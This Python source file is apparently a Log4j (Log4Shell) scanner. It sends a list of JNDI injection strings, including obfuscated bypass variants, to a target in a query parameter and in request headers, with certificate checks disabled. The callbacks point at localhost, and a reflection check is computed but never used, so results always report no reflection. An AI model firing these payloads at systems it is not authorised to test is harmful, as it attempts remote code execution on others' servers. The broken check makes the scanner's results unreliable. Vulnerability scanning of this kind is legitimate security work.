import httpx
import re

JNDI_PAYLOADS = [
    ("jndi_ldap", "${jndi:ldap://localhost/a}", "ldap"),
    ("jndi_rmi", "${jndi:rmi://localhost/a}", "rmi"),
    ("jndi_dns", "${jndi:dns://localhost/a}", "dns"),
    ("jndi_ldap_lower", "${jndi:ldap://127.0.0.1:1389/a}", "ldap"),
    ("env_defaults", "${${env:FOO:-j}ndi}", "env_bypass"),
    ("upper_lower", "${jndi:LDAP://localhost/a}", "ldap"),
    ("nested", "${${lower:j}ndi:${lower:l}dap://localhost/a}", "ldap"),
]

HEADERS = [
    "User-Agent",
    "X-Api-Version",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "Referer",
    "Cookie",
    "Authorization",
]


async def log4j_scan(target: str) -> dict:
    results = []
    base = target.rstrip("/")
    async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
        for payload_name, payload, _ in JNDI_PAYLOADS:
            url = f"{base}?test={__import__('urllib').parse.quote(payload)}"
            try:
                resp = await client.get(url, headers={"User-Agent": payload})
                response_lower = resp.text.lower()
                jndi_reflected = "${" not in response_lower and "jndi" not in response_lower
                results.append({
                    "payload": payload_name,
                    "param": payload[:40],
                    "status": resp.status_code,
                    "size": len(resp.text),
                    "reflected": False,
                })
            except httpx.HTTPError as e:
                results.append({"payload": payload_name, "error": str(e)})
        for header in HEADERS[:3]:
            for payload_name, payload, _ in JNDI_PAYLOADS[:3]:
                try:
                    resp = await client.get(base, headers={header: payload})
                    results.append({
                        "payload": f"{header}:{payload_name}",
                        "header": header,
                        "status": resp.status_code,
                        "size": len(resp.text),
                        "reflected": False,
                    })
                except httpx.HTTPError:
                    continue
    return {"target": target, "tests": results, "total": len(results), "note": "JNDI injection requires out-of-band callback server to confirm. These tests detect potential reflection/behavior changes."}
